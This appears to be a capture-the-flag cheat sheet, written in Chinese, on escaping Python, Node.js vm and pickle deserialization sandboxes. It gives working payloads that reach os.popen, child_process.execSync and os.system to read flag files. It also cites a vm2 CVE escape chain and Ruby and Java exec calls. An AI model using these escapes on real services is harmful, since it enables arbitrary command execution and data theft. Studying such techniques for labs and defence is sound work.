# 主题：代码执行沙箱逃逸（Python / Node.js / 反序列化）

## 场景
在线代码执行服务对运行环境施加沙箱限制（删 builtins、隔离上下文），需逃逸读系统文件。

## 第一步：探测边界
- `print(1+1)` 正常 → 代码执行
- `print(dir())` 报 `NameError: name 'dir' is not defined` → `__builtins__` 被删
- `print(__builtins__)` → 看剩余白名单
- 确认对象内省通道：`().__class__.__base__.__subclasses__()` 可用

## Python 沙箱逃逸
```
# 通用链：找 os 模块
(1).__class__.__base__.__subclasses__()          # 所有类，找 __init__.__globals__ 含 'os' 的
globals()['os'].popen('cat /path/flag1.txt').read()
# 常用目标类: os._wrap_close
```
- 备选目标：`_io.FileIO`（读文件）、`subprocess.Popen` / `os.system`（RCE）
- 写脚本遍历 `__subclasses__`，找 `__init__.__globals__` 带 `os`/`builtins`/`subprocess`/`sys` 的

## Node.js vm 沙箱逃逸
```
this.constructor.constructor('return process')()
process.mainModule.require('child_process').execSync('cat /path/flag1.txt').toString()
```
- 备选：`process.binding('spawn_sync')`、`require('fs').readFileSync(...)`
- vm2 低版本：CVE-2023-32314（Error.name 的 toString Proxy 拿宿主 process）等逃逸链

## Python pickle 反序列化 RCE
- 服务端 `pickle.loads` 受限 → 手工构造调用链：`object.__subclasses__` → `os._wrap_close` → `__globals__['popen']`
- 或构造 `__reduce__` 指定 `os.system`/`eval`

## 其它语言参考
- Ruby: `Object.const_get(:IO)`、`binding.eval`、`Kernel.system`
- Java: 反射 `Runtime.getRuntime().exec`、EL 表达式

## 提示
- 输出可能截断 → 一次只读一个文件、`print` 全量
- 命令输出含 flag 逐字存档
